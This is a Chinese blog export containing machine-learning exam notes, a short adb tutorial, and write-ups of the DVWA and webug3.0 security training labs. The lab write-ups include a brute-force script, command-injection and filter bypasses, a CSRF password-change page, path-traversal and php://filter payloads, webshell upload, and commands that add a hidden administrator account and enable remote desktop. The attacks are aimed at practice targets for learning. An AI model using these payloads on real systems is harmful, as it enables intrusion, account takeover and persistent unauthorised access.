href="#Cross-Validation都考" class="headerlink" title="Cross-Validation都考"></a>Cross-Validation都考</h2><h3 id="Overﬁtting-Underﬁtting-and-Cross-Validation"><a href="#Overﬁtting-Underﬁtting-and-Cross-Validation" class="headerlink" title="Overﬁtting, Underﬁtting and Cross-Validation"></a>Overﬁtting, Underﬁtting and Cross-Validation</h3><h4 id="Problem-of-Model-Validation"><a href="#Problem-of-Model-Validation" class="headerlink" title="Problem of Model Validation"></a>Problem of Model Validation</h4><p>Q1. Why We All Need Validation<br>Business Reasons<br>Need to choose the best model.<br>Measure accuracy/power of selected model.<br>Good to measure ROI of the modeling project.<br>Statistical Reasons<br>Model building techniques are inherently designed to minimize “loss” or “bias”.<br>To an extent, a model will always fit “noise” as well as “signal”.<br>If you just fit a bunch of models on a given dataset and choose the “best” one, it will likely be overly “optimistic”.<br>企业的原因<br>需要选择最好的模型。<br>测量精度/模型功率。<br>很好地度量建模项目的ROI。<br>统计方面的原因<br>模型构建技术本质上是为了最小化“损失”或“偏见”而设计的。<br>在某种程度上，一个模型总是符合“噪声”和“信号”。<br>如果你只是在给定的数据集上选择一堆模型，选择“最佳”，那么它可能过于“乐观”。</p><h4 id="Underfitting-and-Overfitting"><a href="#Underfitting-and-Overfitting" class="headerlink" title="Underfitting and Overfitting"></a>Underfitting and Overfitting</h4><p>Underfitting: high bias 偏差大<br>Model cannot capture the underlying trend of the data<br>Overfitting: high variance 方差大<br>Model is too complex to capture the true pattern<br>Model seeks to fit the noise or outlier of the data </p><h4 id="Bias-Variance-Tradeoff"><a href="#Bias-Variance-Tradeoff" class="headerlink" title="Bias-Variance Tradeoff"></a>Bias-Variance Tradeoff</h4><p>Error on the dataset used to fit the model can be misleading<br>Doesn’t predict future performance.<br>Too much complexity can diminish model’s accuracy on future data.<br>Sometimes called the Bias-Variance Tradeoff.<br>用于拟合模型的数据集上的错误可能会引起误解。<br>不能预测未来的表现。<br>太多的复杂性会降低模型对未来数据的准确性。<br>有时称为偏差方差权衡。<br>Complex model:<br>Low “bias”:<br>The model fit is good on the training data.<br>The model value is close to the data’s expected value.<br>High “Variance”:<br>Model more likely to make a wrong prediction.<br>复杂的模型：<br>低偏压：<br>模型拟合对训练数据有较好的拟合效果。<br>模型值接近数据的期望值。<br>高“方差”：<br>更有可能做出错误预测的模型。</p><h5 id="How-do-we-know-if-we-are-underfitting-or-overfitting"><a href="#How-do-we-know-if-we-are-underfitting-or-overfitting" class="headerlink" title="How do we know if we are underfitting or overfitting?"></a>How do we know if we are underfitting or overfitting?</h5><p>If by increasing capacity we decrease generalization error, then we are underfitting, otherwise we are overfitting.<br>If the error in representing the training set is relatively large and the generalization error is large, then underfitting;<br>如果我们增加容量，降低泛化误差，那么我们欠学习，否则我们过。<br>如果错误代表训练集比较大，产生的误差较大，那么欠；<br>Need to increase capacity (complexity of models).<br>   – If the error in representing the training set is relatively small and the generalization error is large, then overfitting;<br>Need to decrease capacity or increase training set.<br>   – Many features and relatively small training set.<br>   – if you have chosen a large capacity to complement the many features, then you might overfit the data:<br>need to decrease the capacity.<br>需要增加容量（模型的复杂性）。<br>–如果错误代表训练集比较小的泛化误差大，然后过；<br>需要减少能力或增加训练集。<br>-许多功能和相对较小的训练集。<br>–如果你选择了一个大容量为补充的多种特征，那么你可能过度拟合数据：<br>需要降低容量。</p><h3 id="Cross-Validation-重要"><a href="#Cross-Validation-重要" class="headerlink" title="Cross-Validation 重要"></a>Cross-Validation 重要</h3><h4 id="Training-Data-Validation-Data-Testing-Data"><a href="#Training-Data-Validation-Data-Testing-Data" class="headerlink" title="Training Data, Validation Data, Testing Data"></a>Training Data, Validation Data, Testing Data</h4><h4 id="Performance-Report"><a href="#Performance-Report" class="headerlink" title="Performance Report"></a>Performance Report</h4><h4 id="Parameter-Tuning"><a href="#Parameter-Tuning" class="headerlink" title="Parameter Tuning"></a>Parameter Tuning</h4><h4 id="K-Fold-Cross-Validation"><a href="#K-Fold-Cross-Validation" class="headerlink" title="K-Fold Cross-Validation"></a>K-Fold Cross-Validation</h4><h2 id="PCA：只考1-16页，即Another-Point-of-View-之后都不考"><a href="#PCA：只考1-16页，即Another-Point-of-View-之后都不考" class="headerlink" title="PCA：只考1-16页，即Another Point of View 之后都不考"></a>PCA：只考1-16页，即Another Point of View 之后都不考</h2><h2 id="Ensemble-Methods：Adaboost-GBDT不考"><a href="#Ensemble-Methods：Adaboost-GBDT不考" class="headerlink" title="Ensemble Methods：Adaboost: GBDT不考"></a>Ensemble Methods：Adaboost: GBDT不考</h2><h2 id="Ensemble-Methods-Decision-Tree-and-Random-Forest-：-Random-forest不考"><a href="#Ensemble-Methods-Decision-Tree-and-Random-Forest-：-Random-forest不考" class="headerlink" title="Ensemble Methods(Decision Tree and Random Forest)： Random forest不考"></a>Ensemble Methods(Decision Tree and Random Forest)： Random forest不考</h2><h2 id="Clustering：-Hierarchical-Agglomerative-Clustering不考"><a href="#Clustering：-Hierarchical-Agglomerative-Clustering不考" class="headerlink" title="Clustering： Hierarchical Agglomerative Clustering不考"></a>Clustering： Hierarchical Agglomerative Clustering不考</h2><ol><li>Clustering</li><li>K-Means Clustering</li><li>Hierarchical Agglomerative Clustering 不考</li><li>Conclusion</li></ol><h2 id="Recommendation-system：只考问题定义：什么叫Collaborative-Filtering，Recommendation有哪几种典型方法及各自优缺点，Cold-start-Recommendation概念；不考方法，方法在课程项目中体现。"><a href="#Recommendation-system：只考问题定义：什么叫Collaborative-Filtering，Recommendation有哪几种典型方法及各自优缺点，Cold-start-Recommendation概念；不考方法，方法在课程项目中体现。" class="headerlink" title="Recommendation system：只考问题定义：什么叫Collaborative Filtering，Recommendation有哪几种典型方法及各自优缺点，Cold-start Recommendation概念；不考方法，方法在课程项目中体现。"></a>Recommendation system：只考问题定义：什么叫Collaborative Filtering，Recommendation有哪几种典型方法及各自优缺点，Cold-start Recommendation概念；不考方法，方法在课程项目中体现。</h2><p>Recommender System applies statistical and knowledge discovery techniques to the problem of making product recommendations.<br>推荐系统将统计和知识发现技术应用于产品推荐问题。<br>Advantages of recommender systems:<br>Improve conversion rate: Help customers find a product she/he wants to buy.<br>增加营业额<br>Cross-selling: Suggest additional products.<br>促销，附加商品<br>Improve customer loyalty: Create a value-added relationship. 提高用户忠诚度</p><p>Q1. 什么叫Collaborative Filtering<br>Make automatic predictions (filtering) about the interests of a user by collecting preferences or taste information from many other users (collaboration).<br>通过收集偏好或从许多其他用户那里获取信息来进行用户兴趣的自动预测（过滤）（协作）。<br>A1. Collaborative filtering， 即协同过滤。 使用某人的行为behavior来预测其它人会做什么。协同过滤就是基于邻域的算法，分为基于用户的协同过滤算法UserCF和基于物品的协同过滤算法ItemCF。<br>一种是User-Based，即是利用用户与用户之间的相似性，生成最近的邻居，当需要推荐的时候，从最近的邻居中得到推荐得分最高的几篇文章，用作推荐；<br>另外一种是Item-Based，即是基于item之间的关系，针对item来作推荐</p><p>Q2. Recommendation有哪几种典型方法及各自优缺点<br>Memory-based CF :utilize the entire user-item database to generate a prediction.</p><ul><li>User-based CF : find similar users to predict ratings.</li><li>Item-based CF : use similar items to predict ratings<br>Model-based CF : build a model from the rating data<br>( Matrix factorization, etc.) and use this model to predict missing ratings.<br>矩阵分解</li></ul><p>User-based similarity is more dynamic.<br>Precompute user neighbourhood may lead to poor predictions.<br>Item-based similarity is static.<br>Precompute item neighbourhood may provide accurate results.<br>基于用户的相似性更具动态性。<br>预计算用户附近可能导致不良的预测。<br>基于项的相似性是静态的。<br>预计算项目附近可以提供准确的结果。</p><p>Memory-Based CF<br>优点：<br>Require minimal knowledge engineering efforts.<br>Users and products are symbols without any internal structure or characteristics.<br>Produce good-enough results in most cases.<br>需要最少的知识工程努力。<br>用户和产品是没有任何内部结构或特性的符号。<br>在大多数情况下产生足够好的结果。<br>缺点：<br>Require a large number of explicit and reliable ratings.<br>Highly time consuming to compute similarity with millions of users &amp; items.<br>需要大量明确可靠的评级。<br>非常耗费时间来计算与数以百万计的用户和项目的相似性。</p><p>Model-based CF<br>Models are learned from the underlying data rather than heuristics<br>模型是从底层数据中学习的，而不是启发式的。<br>Models of user ratings (or purchases):<br>用户评级模型（或购买）：<br>Matrix Factorization is the most widely used algorithm.</p><p>Comparison between SGD and ALS<br>ALS is easier to parallelize than SGD.<br>ALS converges faster than the SGD.<br>SGD has less storage complexity than ALS.<br>(ALS needs to store the rating matrix R)<br>SGD has less computational complexity than ALS.<br>(ALS needs to compute the matrix-vector multiplication)<br>SGD和ALS的比较<br>ALS是比SGD容易并行化。<br>ALS的SGD更快的收敛速度比。<br>SGD比ALS较少的存储复杂度。<br>（ALS需要存储评级矩阵R）<br>SGD具有较小的计算复杂度比ALS。<br>（ALS需要计算矩阵向量乘法）</p><p>推荐系统构建三大方法：基于内容的推荐content-based，协同过滤collaborative filtering，隐语义模型(LFM, latent factor model)推荐</p><ul><li>基于内容的推荐content-based</li><li>协同过滤collaborative filtering</li><li>隐语义模型(LFM, latent factor model)推荐</li></ul><p>Q3. Cold-start Recommendation概念<br>如何在没有大量用户数据的情况下设计个性化推荐系统并让用户对推荐结果满意从而愿意使用推荐系统，就是冷启动问题。<br>1）用户冷启动：如何给新用户做个性化推荐<br>2）物品冷启动：如何将新物品推荐给可能对其感兴趣的用户。在新闻网站等时效性很强的网站中非常重要。<br>3）系统冷启动：如何在一个新开发的网站上设计个性化推荐，从而在网站刚发布时就让用户体验到个性化推荐服务。没有用户，只有一些物品信息。</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>adb基础使用</title>
      <link href="//blog/2017/adb%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html"/>
      <url>//blog/2017/adb%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<h1 id="adb取出安装的软件"><a href="#adb取出安装的软件" class="headerlink" title="adb取出安装的软件"></a>adb取出安装的软件</h1><ol><li><p>查看设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure></li><li><p>进入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br></pre></td></tr></table></figure></li><li><p>查看已安装应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm list packages</span><br></pre></td></tr></table></figure></li><li><p>找到apk的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm path com.mimu.fm</span><br></pre></td></tr></table></figure></li><li><p>pull出应用包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit #退出shell</span><br><span class="line">adb pull /system/app/FM/FM.apk</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> adb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DVWA writeup</title>
      <link href="//blog/2017/DVWA-writeup.html"/>
      <url>//blog/2017/DVWA-writeup.html</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Vulnerable-Web-Application"><a href="#Damn-Vulnerable-Web-Application" class="headerlink" title="Damn Vulnerable Web Application"></a>Damn Vulnerable Web Application</h1><h2 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解 Brute Force"></a>暴力破解 Brute Force</h2><p>重复猜密码（账号）</p><p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱密码。英文中的词、家的名字、过于简短的密码(6-7位)、可预测的模式</span><br><span class="line">验证过程没有难以绕过(识别)的验证码</span><br><span class="line">没有尝试多次后封IP地址等</span><br></pre></td></tr></table></figure></p><p>low：<br>直接获取参数拼接到sql语句中去了，然后sql注入的话，直接上sqlmap。<br>暴力破解，burpsuite抓包，发送到repeater，发现没有别的验证，直接可以暴力破解密码。<br>错误时有提示”Username and/or password incorrect”<br>尝试暴力破解admin账号的密码。<br>medium：<br>添加了mysqli_real_escape_string函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string转义字符串中的特殊字符：</span><br><span class="line">  编码的字符是 NUL（ASCII 0）、\n、\r、\、&apos;、&quot; 和 Control-Z</span><br><span class="line">  如： &apos;  变成 \&apos;</span><br></pre></td></tr></table></figure></p><p>但是还是可以注入。<br>然后，增加了sleep(2)延时来一定程度上抑制暴力破解，但是其实是没有用的。<br>high:<br>添加了checkToken，burpsuite添加自动获取user_token比较麻烦，直接写个简单的python脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">def read_token(html):</span><br><span class="line">l = html.find(&quot;name=&apos;user_token&quot;)+25</span><br><span class="line">print(l)</span><br><span class="line">return html[l:l+32]</span><br><span class="line">url=&quot;http://hack.com/DVWA/vulnerabilities/brute/index.php?username=admin&amp;password=%s&amp;Login=Login&amp;user_token=%s&quot;</span><br><span class="line">passwords = [&apos;t&apos;,&apos;admin&apos;,&apos;123456&apos;,&apos;password&apos;,&apos;test&apos;]</span><br><span class="line">token = &apos;d6892bec17f92ebb73c5a57825c355e9&apos;</span><br><span class="line">for p in passwords:</span><br><span class="line">print(p)</span><br><span class="line">r = requests.get(url=url%(p,token),cookies=&#123;&apos;security&apos;:&apos;high&apos;, &apos;PHPSESSID&apos;:&apos;lu4qnvvftqnpjc4a2hf674juo2&apos;&#125;,headers=&#123;&apos;Referer&apos;:&apos;http://hack.com/DVWA/vulnerabilities/brute/index.php&apos;&#125;)</span><br><span class="line">#print(r.text)</span><br><span class="line">#file = open(p+&apos;.html&apos;,&apos;w&apos;)</span><br><span class="line">#file.write(r.text)</span><br><span class="line">#file.close</span><br><span class="line">s = r.text</span><br><span class="line">if s.find(&apos;Username and/or password incorrect.&apos;) == -1:</span><br><span class="line">print(&apos;------Got it!!!&apos;)</span><br><span class="line">token = read_token(s)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure></p><p>还是可以sqlmap注入，可能需要burpsuite的Macro配合下，但是貌似不用都行。。。</p><p>impossible:<br>添加stripslashes函数去除反斜杠，难道是防止宽字节注入，然后，sql语句是用了预编译，断绝了注入的想法，密码错了数次后上锁，暴力破解绝望。</p><h2 id="命令注入-Command-Injection"><a href="#命令注入-Command-Injection" class="headerlink" title="命令注入 Command Injection"></a>命令注入 Command Injection</h2><p>对用户数据过滤不严格导致的，可以通过构造特殊的数据进行攻击。可以直接用&amp;&amp;和;来执行多条命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br><span class="line">;</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">|</span><br></pre></td></tr></table></figure></p><p>low：<br>后台没有进行任何过滤，直接127.0.0.1&amp;&amp;dir就可以注入。&amp;&amp;或;<br>medium：<br>后台将&amp;&amp;和;替换为空，可以用||<br>high:<br>进行了更多的替换，然而，审视黑名单发现，将’| ‘替换为空，|后面有一个空格，所以，我们直接构造127.0.0.1 |dir 注意 |和dir之间没有空格即可。<br>impossible:<br>检验了保证IP地址都是数字，已经不能注入了。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站点请求伪造<br>当登陆等后，会生成一个会话，此时，可以通过会话验证登录的身份。<br>low:<br>没有进行任何验证，可以伪造网址发给朋友<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=mm.jpg&gt;</span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#&quot; frameborder=&quot;0&quot; ;0&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>medium：<br>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检查HTTP_REFERER中是否包含SERVER_NAME直接将用于欺骗的网站的URL中包含有SERVER_NAME<br>如127.0.0.1.html<br>high:<br>采用了User_token来验证。<br>可以尝试利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()</span><br><span class="line">  &#123;</span><br><span class="line">   document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line">  document.getElementById(&quot;transfer&quot;).submit();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p><p>impossible:<br>需要输入当前密码才可以改密码。</p><h2 id="文件包含-File-Inclusion"><a href="#文件包含-File-Inclusion" class="headerlink" title="文件包含 File Inclusion"></a>文件包含 File Inclusion</h2><p>包含的文件无论文件后缀名是否为php，都会尝试当作php，如果真的不是，则打印文件内容。<br>所以，可能导致文件读取和代码执行。<br>low：<br>没有任何过滤。<br>medium：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://和https:// 替换为空</span><br><span class="line">../和、..&quot; 替换为 空</span><br></pre></td></tr></table></figure></p><p>high：<br>文件名需要符合file*或include.php<br>impossible：<br>白名单，没法子了。</p><h2 id="文件上传-File-Upload"><a href="#文件上传-File-Upload" class="headerlink" title="文件上传 File Upload"></a>文件上传 File Upload</h2><p>能够上传上去<br>能够执行<br>low:<br>直接上传一句话<br>medium:<br>上传的文件名限定了<br>high:<br>需要配合文件包含<br>impossible:<br>不安全的验证 Insecure CAPTCHA<br>验证过程中的逻辑漏洞。</p><h2 id="SQL-注入-SQL-Injection"><a href="#SQL-注入-SQL-Injection" class="headerlink" title="SQL 注入 SQL Injection"></a>SQL 注入 SQL Injection</h2><p>low:<br>什么都没有检测、过滤<br>medium：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string</span><br></pre></td></tr></table></figure></p><p>依旧注入、<br>high：<br>impossible：<br>POD</p><h2 id="SQL盲注-SQL-Injection-Blind"><a href="#SQL盲注-SQL-Injection-Blind" class="headerlink" title="SQL盲注 SQL Injection (Blind)"></a>SQL盲注 SQL Injection (Blind)</h2><p>sqlmap<br>Weak Session IDs<br>XSS (DOM)<br>反射型XSS (Reflected)<br>储存型XSS (Stored)</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>webug3.0 writeup</title>
      <link href="//blog/2017/webug3-0-writeup.html"/>
      <url>//blog/2017/webug3-0-writeup.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><h2 id="第一关-很简单的一个注入"><a href="#第一关-很简单的一个注入" class="headerlink" title="第一关:很简单的一个注入"></a>第一关:很简单的一个注入</h2><p>普通的GET注入<br>的确简单，丢个单引号就报错了，union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://192.168.193.128/pentest/test/sqli/sqltamp.php?gid=1&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot; --technique=U</span><br></pre></td></tr></table></figure><h2 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关:从图片中你能找到什么？"></a>第二关:从图片中你能找到什么？</h2><p>从图片中找到有用的信息</p><p><img src="/img/webug3/123.jpg" alt=""></p><p>binwalk、foremost可以发现rar，内有123.txt文件写着密码123<br>然后没思路，后台看到flag应该为flang{fa136c7c341a6e26}<br>加油</p><h2 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关:你看到了什么？"></a>第三关:你看到了什么？</h2><p>渗透网站的时候目录也很重要</p><p>DirBuster扫下目录</p><p><img src="/img/webug3/1.png" alt=""></p><p>发现有这个目录</p><h2 id="第四关-告诉你了flang是5位数"><a href="#第四关-告诉你了flang是5位数" class="headerlink" title="第四关:告诉你了flang是5位数"></a>第四关:告诉你了flang是5位数</h2><p>当遇到五位验证码的时候可以爆破<br>没有看到验证码。。。考虑应该是考查爆破验证码，题目没出好吧</p><h2 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h2><p>头部的一个注入<br>看到头部注入就想到X-Forwarded-For 和 User-Agent</p><p><img src="/img/webug3/2.png" alt=""></p><h2 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h2><p>支付问题：用最少的钱去购买到一本书！随便输入admin/admin进去发现登录失败跳转，但是看返回包，后面的内容居然还是出现了，<br>估计是后台只是设置了跳转，没有die，还会执行后面的内容<br>禁用跳转后<br><img src="/img/webug3/3.png" alt=""></p><p>点击购买发现提示用户没登录<br><img src="/img/webug3/4.png" alt=""></p><p>改下uid<br><img src="/img/webug3/5.png" alt=""></p><p>成功用别人的钱买书了<br>可是题目说是”用最少的钱去购买到一本书”<br>改金额，金额改为0<br><img src="/img/webug3/6.png" alt=""></p><h2 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关:越权"></a>第七关:越权</h2><p>已有账号：tom 密码123456<br><img src="/img/webug3/7.png" alt=""></p><p>并没有验证原密码，这直接修改即可越权</p><h2 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h2><p>管理员每天晚上十点上线<br><img src="/img/webug3/8.png" alt=""></p><p>burpsuite生成CSRF POC</p><h2 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h2><p>能不能从我到百度那边去？<br>额，需要提交参数url即可，怎么想到的呢！</p><h2 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关:文件下载"></a>第十关:文件下载</h2><p>根据提示下载需要的文件<br>题目链接应该换成这个</p><p>很明显的任意文件读取，直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure></p><p><img src="/img/webug3/9.png" alt=""></p><p>各种读文件，有连接数据库的php文件，顺着可以找到config文件，读到数据库密码的。</p><h2 id="第十一关-我和上一题有点像"><a href="#第十一关-我和上一题有点像" class="headerlink" title="第十一关:我和上一题有点像"></a>第十一关:我和上一题有点像</h2><p>boom，沙卡拉卡！<br>GET换成了POST<br><img src="/img/webug3/10.png" alt=""></p><h2 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h2><p>请帮我找回在D盘下。<br>直接上传webshell<br><img src="/img/webug3/11.png" alt=""></p><p>菜刀连接，跳转到D盘出错了</p><ol><li><p>新建一个用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net user [username] [password] /add</span><br><span class="line">net user systemis systemis /add</span><br></pre></td></tr></table></figure></li><li><p>添加到Administrators用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net localgroup Administrators [username] /add</span><br><span class="line">net localgroup Administrators systemis /add</span><br></pre></td></tr></table></figure></li><li><p>开启3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></li></ol><p>mstsc连接远程桌面<br><img src="/img/webug3/12.png" alt=""></p><p>还是访问不到D盘，设备未就绪，应该是没插入光盘吧</p><h2 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h2><p>看看你能给我带来什么惊喜？<br><img src="/img/webug3/13.png" alt=""></p><h2 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h2><p>suprise！<br>GET 换成 POST一样<br><img src="/img/webug3/14.png" alt=""></p><h2 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h2><p>上传不了图片怎么办？<br>改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.128/pentest/test/11/upload/webshell0.php</span><br></pre></td></tr></table></figure></p><h2 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关:明天双十一"></a>第十六关:明天双十一</h2><p>我从公司网络去剁手了！<br><img src="/img/webug3/15.png" alt=""></p><p>想不到既需要host为10.10.10.10<br>又验证了referer是来自www.baidu.com<br>这里的设置真的不甚理解。</p><h1 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h1><h2 id="第一关-出来点东西吧"><a href="#第一关-出来点东西吧" class="headerlink" title="第一关:出来点东西吧"></a>第一关:出来点东西吧</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../etc/passwd</span><br></pre></td></tr></table></figure><p>系统是windows，所以应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../WINDOWS/win.ini</span><br></pre></td></tr></table></figure></p><p>因为是require_once，利用PHP伪协议进行文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../../../../../../../../../../WINDOWS/win.ini</span><br><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p><img src="/img/webug3/16.png" alt=""></p><h2 id="第二关-提交方式是怎么样的啊？"><a href="#第二关-提交方式是怎么样的啊？" class="headerlink" 